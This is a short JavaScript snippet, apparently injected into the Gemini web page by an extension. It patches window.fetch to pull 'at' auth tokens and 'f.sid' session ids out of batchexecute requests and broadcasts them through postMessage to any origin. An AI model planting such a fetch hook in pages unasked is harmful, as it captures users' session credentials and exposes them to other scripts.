(function() {
  if (window.__geminiHookInstalled) return;
  window.__geminiHookInstalled = true;

  const origFetch = window.fetch.bind(window);
  window.fetch = function(input, init) {
    const url = typeof input === 'string' ? input : (input instanceof Request ? input.url : '');
    const body = typeof init?.body === 'string' ? init.body : '';

    // Intercept batchexecute requests to extract auth tokens
    if (url.includes('batchexecute') && body) {
      let at = null;
      let sid = null;

      const atMatch = body.match(/[?&]at=([^&]+)/);
      if (atMatch) at = decodeURIComponent(atMatch[1]);

      const sidMatch = url.match(/[?&]f\.sid=([^&]+)/);
      if (sidMatch) sid = decodeURIComponent(sidMatch[1]);

      if (at || sid) {
        window.postMessage({
          type: 'GEMINI_CREDENTIALS',
          payload: { at, sid, url, timestamp: Date.now() }
        }, '*');
      }
    }

    return origFetch(input, init);
  };
})();
